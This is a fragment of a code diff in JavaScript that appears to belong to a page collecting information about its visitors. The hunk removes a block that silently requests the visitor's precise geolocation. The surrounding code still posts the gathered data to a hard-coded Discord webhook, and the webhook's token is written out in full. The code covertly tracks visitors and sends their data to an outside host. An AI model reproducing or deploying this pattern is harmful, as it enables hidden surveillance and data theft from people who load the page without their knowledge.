@@ -22,23 +22,6 @@
       geolocation: null
     };
 
-    try {
-      await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            info.geolocation = {
-              lat: pos.coords.latitude,
-              lon: pos.coords.longitude,
-              accuracy: pos.coords.accuracy
-            };
-            resolve();
-          },
-          () => resolve(), 
-          { timeout: 3000 }
-        );
-      });
-    } catch {}
-
     fetch("https://discord.com/api/webhooks/1442229849287692338/pPy2dPqNwMFkFtRLoNuFfo0Vk8GQN_XmxI6ZA9VjqlqHI9_7DTcJ-GmhrGrH8o4CJtvE", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
